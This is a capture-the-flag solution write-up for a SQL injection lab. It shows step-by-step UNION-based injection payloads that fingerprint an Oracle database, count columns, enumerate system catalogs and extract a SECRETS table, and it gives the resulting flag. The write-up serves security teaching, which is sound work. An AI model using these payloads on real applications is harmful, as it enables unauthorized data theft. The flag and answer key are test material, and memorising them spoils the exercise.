# SQLi-008 Solution: Concatenation-based DBMS Fingerprinting

## Step 1: Test for SQL Injection

**Basic test:**

```
GET /api/service?name=a'+ORDER+BY+1 HTTP/1.1
```

Error → SQLi confirmed!

---

## Step 2: Concatenation Syntax Detection

**Test Oracle/PostgreSQL (`||` operator):**

```sql
Auth'||'entication
```

✅ Returns "Authentication" service → Either Oracle or PostgreSQL

**Test MSSQL (`+` operator):**

```sql
Auth'+'entication
```

❌ Would fail if not MSSQL

**Test MySQL (CONCAT):**

```sql
' AND 1=1 AND 'x'='x
```

---

## Step 3: Distinguish Oracle from PostgreSQL

Oracle requires `FROM dual` for SELECT without table, PostgreSQL doesn't.

**Test with FROM dual:**

```sql
x' UNION SELECT 1,'test','desc','status' FROM dual WHERE 'x'='x
```

✅ Works → **Oracle confirmed!**

**Test without FROM dual:**

```sql
x' UNION SELECT 1,'test','desc','status' WHERE 'x'='x
```

❌ Would fail in Oracle

---

## Step 4: Determine Number of Columns

**Method 1: ORDER BY**

```sql
a' AND '1'='1' ORDER BY 1
a' AND '1'='1' ORDER BY 2
a' AND '1'='1' ORDER BY 3
a' AND '1'='1' ORDER BY 4
a' AND '1'='1' ORDER BY 5  → Error
```

**Method 2: UNION SELECT NULL**

```sql
x' UNION SELECT NULL,NULL,NULL,NULL FROM dual WHERE 'x'='x
```

✅ **Result:** Query có 4 cột

---

## Step 5: Enumerate Database Structure

**List all tables:**

```sql
x' UNION SELECT 1,table_name,'a','a' FROM user_tables WHERE 'x'='x
```

**List columns of SECRETS table:**

```sql
x' UNION SELECT 1,column_name,'a','a' FROM all_tab_columns WHERE table_name='SECRETS' AND 'x'='x
```

**Result:** Table `secrets` có columns: `id, name, value`

---

## Step 6: Extract Flag

**Final payload:**

```sql
x' UNION SELECT id,name,value,'a' FROM SECRETS WHERE 'x'='x
```

**URL Encoded:**

```
GET /api/service?name=x'+UNION+SELECT+id,name,value,'a'+FROM+SECRETS+WHERE+'x'%3d'x HTTP/1.1
```

**Response:**

```json
{
  "services": [
    {
      "id": 1,
      "name": "sqli_008",
      "description": "FLAG{c0nc4t_0r4cl3_p1p3_0p3r4t0r}",
      "status": "a"
    }
  ]
}
```

---

## Flag

```
FLAG{c0nc4t_0r4cl3_p1p3_0p3r4t0r}
```

---

## Key Learnings

1. **Oracle concatenation:** Uses `||` operator (same as PostgreSQL)
2. **Oracle-specific:** Requires `FROM dual` for SELECT without table
3. **Closing quotes:** Query has trailing quote → use `AND 'x'='x` to close properly
4. **Table names:** Oracle stores table names in UPPERCASE in system catalog
5. **String concatenation fingerprinting:**
   - Oracle/PostgreSQL: `||`
   - MSSQL: `+`
   - MySQL: `CONCAT()` or space
6. **FROM dual** is the key differentiator between Oracle and PostgreSQL
